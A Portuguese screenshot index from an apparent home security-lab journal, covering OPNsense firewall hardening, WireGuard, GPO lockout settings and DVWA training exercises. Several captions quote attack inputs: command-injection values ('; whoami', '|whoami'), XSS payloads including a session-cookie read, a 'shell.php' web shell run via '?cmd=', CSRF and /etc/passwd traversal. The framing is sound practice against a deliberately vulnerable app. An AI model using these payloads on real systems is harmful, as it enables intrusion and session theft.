- `screenshots/2026-08-24/entrada71-dialogo-selecionar-aplicacao-bug.png` — diálogo estranho "Selecionar uma aplicação" durante o Get-Credential (Entrada #71)
- `screenshots/2026-08-24/entrada71-aviso-login-confirmado-windows11.png` — aviso de login GPO confirmado visualmente no Windows 11 (Entrada #71)
- `screenshots/2026-08-24/entrada72-firewall-regras-lan-antes.png` — OPNsense, regras LAN apenas com as regras default, antes do hardening (Entrada #72)
- `screenshots/2026-08-24/entrada72-dhcp-leases-servidor-vulneravel.png` — OPNsense, DHCP leases com "show inactive", servidor-vulneravel em 192.168.10.101 (Entrada #72)
- `screenshots/2026-08-24/entrada72-dhcp-mapeamento-estatico.png` — OPNsense, mapeamento estático DHCP do servidor-vulneravel (Entrada #72)
- `screenshots/2026-08-24/entrada72-source-any-tag-trap.png` — a armadilha da tag "any" no campo Source do OPNsense (Entrada #72)
- `screenshots/2026-08-24/entrada72-destination-any-bug-regra-bloqueio.png` — regra de bloqueio com Destination ainda em "any" (bug por corrigir) (Entrada #72)
- `screenshots/2026-08-24/entrada72-diagnostics-states-sem-resultados.png` — Diagnostics: States, sem states antigos encontrados (Entrada #72)
- `screenshots/2026-08-24/entrada72-ip-route-dual-nic-duas-rotas.png` — ip route mostrando as duas rotas default (descoberta do segundo NIC NAT) (Entrada #72)
- `screenshots/2026-08-24/entrada72-regras-lan-ips-corrigidos.png` — regras LAN com os IPs reais corrigidos após a remoção da tag "any", a aguardar "Apply changes" (Entrada #72)
- `screenshots/2026-08-24/entrada72-regras-lan-ips-corrigidos-2.png` — mesma correção de IPs, segunda vista da lista imediatamente antes de aplicar (Entrada #72)
- `screenshots/2026-08-24/entrada72-regra-permitir-trafego-configurada.png` — regra "permitir tráfego" configurada corretamente (Source e Destination) (Entrada #72)
- `screenshots/2026-08-24/entrada72-regras-lan-aplicadas-sucesso.png` — "The changes have been applied successfully", ambas as regras do Servidor Vulnerável (permitir + bloquear) já aplicadas (Entrada #72)
- `screenshots/2026-08-24/entrada72-ping-teste-final-sucesso.png` — teste final: ping ao lab a 0% perda, ping a 8.8.8.8 a 100% perda (confirmação do egress filtering) (Entrada #72)
- `screenshots/2026-08-24/entrada74-lockout-credenciais-invalidas-atraso.png` — ecrã de login, "Credenciais inválidas, a atrasar a próxima tentativa..." (Entrada #74)
- `screenshots/2026-08-24/entrada74-lockout-nome-utilizador-errado.png` — ecrã de login, "O nome de utilizador ou palavra-passe estão errados" (Entrada #74)
- `screenshots/2026-08-24/entrada74-gpmc-account-lockout-policy-final.png` — GPMC, Account Lockout Policy com os valores finais (30 min / 5 tentativas / 30 min) (Entrada #74)


- `screenshots/2026-08-22/entrada57-vm-erro-power-on-lck.png` — erro de arranque da VM "Servidor Vulnerável" causado por ficheiros de bloqueio (.lck) órfãos

- `screenshots/2026-08-22/entrada55-opnsense-lan-antes-192-168-10-1.png` — consola do OPNsense com LAN em 192.168.10.1/24 (antes da correção)
- `screenshots/2026-08-22/entrada55-opnsense-lan-depois-192-168-10-254.png` — consola do OPNsense com LAN corrigido para 192.168.10.254/24
- `screenshots/2026-08-22/entrada55-opnsense-dhcp-conflito-ip-10.png` — página de Leases do OPNsense mostrando a reserva estática conflituosa em 192.168.10.10
- `screenshots/2026-08-22/entrada53-wireguard-cliente-peer-detalhes.png` — painel de detalhes do túnel cliente com o Peer configurado
- `screenshots/2026-08-22/entrada53-wireguard-cliente-peer-editor-config.png` — editor de configuração com a secção [Peer] escrita à mão
- `screenshots/2026-08-22/entrada54-wireguard-download-timeout-firewall.png` — erro de timeout ao descarregar o ficheiro de configuração (porta 8000 bloqueada)
- `screenshots/2026-08-22/entrada54-wireguard-importar-tunel-ficheiro.png` — importação do túnel no Windows 11 via "Importar túnel(es) do arquivo", sem transcrição manual de texto
- `screenshots/2026-08-22/entrada54-wireguard-wgshow-handshake-confirmado.png` — `sudo wg show wg0` no servidor, a confirmar o handshake bem-sucedido e tráfego já transferido
- `screenshots/2026-08-22/entrada54-wireguard-ping-sucesso-final.png` — ping bem-sucedido através do túnel WireGuard, confirmando a ligação

Os prints ilustrativos de cada dia de trabalho ficam guardados em `screenshots/AAAA-MM-DD/`, referenciados a partir da entrada correspondente.

- `screenshots/2026-08-02/entrada06-dvwa-login-page.png` — página de login do DVWA após inicialização da base de dados
- `screenshots/2026-08-02/entrada07-dvwa-welcome-page.png` — página inicial do DVWA após login bem-sucedido
- `screenshots/2026-08-02/entrada08-nmap-pos-dvwa.png` — resultado do scan nmap pós-DVWA, mostrando a porta 80 aberta
- `screenshots/2026-08-02/entrada10-sqli-teste-normal.png` — teste normal do módulo SQL Injection (ID 1 → admin/admin)
- `screenshots/2026-08-02/entrada11-sqli-injecao-bem-sucedida.png` — injeção SQL bem-sucedida, devolvendo todos os 5 utilizadores
- `screenshots/2026-08-06/entrada13-sqli-medium-curl.png` — confirmação do SQL Injection Medium via `curl`, sem depender do browser
- `screenshots/2026-08-11/entrada15-sqli-high-5-utilizadores.png` — SQL Injection High bem-sucedido, devolvendo todos os 5 utilizadores
- `screenshots/2026-08-12/entrada16-sqli-impossible-ataque-falhado.png` — SQL Injection Impossible: mesmo payload do High devolve resultado vazio (ataque falhado por prepared statements)
- `screenshots/2026-08-12/entrada17-cmdinjection-controlo-ping.png` — Command Injection Low: caso de controlo, ping normal a 127.0.0.1
- `screenshots/2026-08-12/entrada17-cmdinjection-whoami.png` — Command Injection Low: injeção `; whoami` devolve `www-data`
- `screenshots/2026-08-12/entrada17-cmdinjection-ls.png` — Command Injection Low: injeção `; ls -la` lista os ficheiros da aplicação
- `screenshots/2026-08-12/entrada18-cmdinjection-medium-semicolon-filtrado.png` — Command Injection Medium: payload do Low (`; whoami`) filtrado, só devolve o ping
- `screenshots/2026-08-12/entrada18-cmdinjection-medium-pipe-bypass.png` — Command Injection Medium: bypass com `|` (pipe) devolve `www-data`
- `screenshots/2026-08-12/entrada18-cmdinjection-medium-doubleamp-bloqueado.png` — Command Injection Medium: `&&` bloqueado pela blacklist, só devolve o ping
- `screenshots/2026-08-12/entrada18-cmdinjection-medium-amp-bypass.png` — Command Injection Medium: bypass com `&` (segundo plano) devolve ping + `www-data`
- `screenshots/2026-08-12/entrada19-cmdinjection-high-pipe-espaco-bloqueado.png` — Command Injection High: `| whoami` (pipe com espaço) bloqueado pela blacklist maior
- `screenshots/2026-08-12/entrada19-cmdinjection-high-amp-bypass.png` — Command Injection High: `&` ainda passa, devolve ping + `www-data`
- `screenshots/2026-08-12/entrada19-cmdinjection-high-pipe-semespaco-bypass.png` — Command Injection High: `|whoami` (pipe sem espaço) contorna o filtro, devolve `www-data`
- `screenshots/2026-08-12/entrada20-cmdinjection-impossible-ip-valido.png` — Command Injection Impossible: só o IP válido é aceite e faz ping
- `screenshots/2026-08-12/entrada20-cmdinjection-impossible-ip-invalido-erro.png` — Command Injection Impossible: qualquer bypass devolve "invalid IP" (whitelist recusa tudo)
- `screenshots/2026-08-12/entrada21-xss-reflected-controlo-hello.png` — XSS Reflected Low: caso de controlo, nome `Pedro` devolve "Hello Pedro"
- `screenshots/2026-08-12/entrada21-xss-reflected-alert.png` — XSS Reflected Low: `<script>alert('XSS')</script>` executa e abre popup
- `screenshots/2026-08-12/entrada21-xss-reflected-cookie-roubada.png` — XSS Reflected Low: `document.cookie` lê a cookie de sessão (PHPSESSID), payload visível no URL
- `screenshots/2026-08-12/entrada22-xss-reflected-medium-script-filtrado.png` — XSS Reflected Medium: `<script>` apagado pelo filtro, aparece só "Hello alert('XSS')" como texto
- `screenshots/2026-08-12/entrada22-xss-reflected-medium-img-bypass.png` — XSS Reflected Medium: bypass com `<img src=x onerror=alert('XSS')>` dispara o popup
- `screenshots/2026-08-12/entrada23-xss-reflected-high-img-bypass.png` — XSS Reflected High: `<img onerror>` ainda passa e dispara o popup
- `screenshots/2026-08-12/entrada23-xss-reflected-high-script-bloqueado.png` — XSS Reflected High: `<ScRiPt>` (variação de maiúsculas) bloqueado, mostra só "Hello >"
- `screenshots/2026-08-12/entrada24-xss-reflected-impossible-payload-texto.png` — XSS Reflected Impossible: `<img onerror>` mostrado como texto literal (output encoding), sem executar
- *(Entrada #25 — screenshots do XSS Stored a inserir na próxima sessão, quando o ambiente de recorte voltar.)*
- `screenshots/2026-08-15/entrada30-xss-dom-medium-teste.png` — XSS DOM Medium: teste do bypass `<img onerror>`, sem popup
- `screenshots/2026-08-15/entrada30-xss-dom-medium-viewsource-sink.png` — XSS DOM Medium: código-fonte revelando o sink `document.write` dentro de `<option>`
- `screenshots/2026-08-15/entrada30-xss-dom-medium-devtools-tentativa.png` — XSS DOM Medium: tentativa (falhada) de confirmar o DOM real via Inspetor de Elementos
- `screenshots/2026-08-15/entrada32-xss-dom-impossible-valor-codificado.png` — XSS DOM Impossible: valor mostrado codificado em URL (`%3Cscript%3E...`), sem executar
- `screenshots/2026-08-15/entrada33-csrf-low-controlo.png` — CSRF Low: caso de controlo, formulário de mudança de password
- `screenshots/2026-08-15/entrada33-csrf-low-ataque-sucesso.png` — CSRF Low: login bem-sucedido com a password do ataque via `<img>`
- `screenshots/2026-08-15/entrada34-csrf-medium-baseline.png` — CSRF Medium: password de base estabelecida via formulário oficial ("Password Changed.")
- `screenshots/2026-08-15/entrada34-csrf-medium-ataque-sucesso.png` — CSRF Medium: login bem-sucedido com a password do ataque
- `screenshots/2026-08-15/entrada35-csrf-high-nivel-confirmado.png` — CSRF High: nível de segurança confirmado antes do teste
- `screenshots/2026-08-15/entrada35-csrf-high-ataque-sucesso.png` — CSRF High: login bem-sucedido, bypass via ausência de Referer
- `screenshots/2026-08-15/entrada36-csrf-impossible-falso-positivo-diagnostico.png` — CSRF Impossible: mensagem "Passwords did not match or current password incorrect", diagnóstico da contaminação do ambiente
- `screenshots/2026-08-15/entrada36-csrf-impossible-reset-db.png` — CSRF Impossible: reposição da base de dados do DVWA
- `screenshots/2026-08-15/entrada36-csrf-impossible-login-failed.png` — CSRF Impossible: "Login failed" com a password do ataque, ambiente limpo
- `screenshots/2026-08-15/entrada36-csrf-impossible-defesa-confirmada.png` — CSRF Impossible: login bem-sucedido só com a password real, confirmando que a defesa resistiu
- `screenshots/2026-08-16/entrada37-fileupload-low-controlo.png` — File Upload Low: página do módulo (caso de controlo)
- `screenshots/2026-08-16/entrada37-fileupload-low-upload-sucesso.png` — File Upload Low: `shell.php successfully uploaded!` (web shell aceite sem validação)
- `screenshots/2026-08-16/entrada37-fileupload-low-rce-www-data.png` — File Upload Low: `?cmd=whoami` devolve `www-data` (RCE confirmado)
- `screenshots/2026-08-16/entrada38-fileupload-medium-bloqueado.png` — File Upload Medium: upload do `.php` bloqueado ("We can only accept JPEG or PNG images")
- `screenshots/2026-08-16/entrada38-fileupload-medium-rce-www-data.png` — File Upload Medium: RCE após bypass do MIME type via `curl` (`www-data`)
- `screenshots/2026-08-17/entrada41-fileinclusion-low-payload-etcpasswd-pagina-em-branco.png` — File Inclusion Low: primeiro teste (traversal relativo), página carregada mas corpo vazio — falha do payload, não defesa
- `screenshots/2026-08-17/entrada41-fileinclusion-phpinfo-allow-url-include-off.png` — File Inclusion: página PHP Info confirmando `allow_url_include` em `Off` (Local e Master) — RFI bloqueado ao nível do PHP
- `screenshots/2026-08-17/entrada47-bruteforce-low-pagina-login.png` — Brute Force Low: página do módulo, teste de controlo com login bem-sucedido (`admin`/`password`)
- `screenshots/2026-08-17/entrada50-bruteforce-high-script-token-sucesso.png` — Brute Force High: terminal com o script de dois passos (token anti-CSRF), a percorrer a wordlist e a encontrar `password` na 5ª tentativa
- `screenshots/2026-08-16/entrada39-fileupload-high-bloqueado.png` — File Upload High: `shell2.php` (ficheiro novo) rejeitado — o bypass do Medium já não funciona
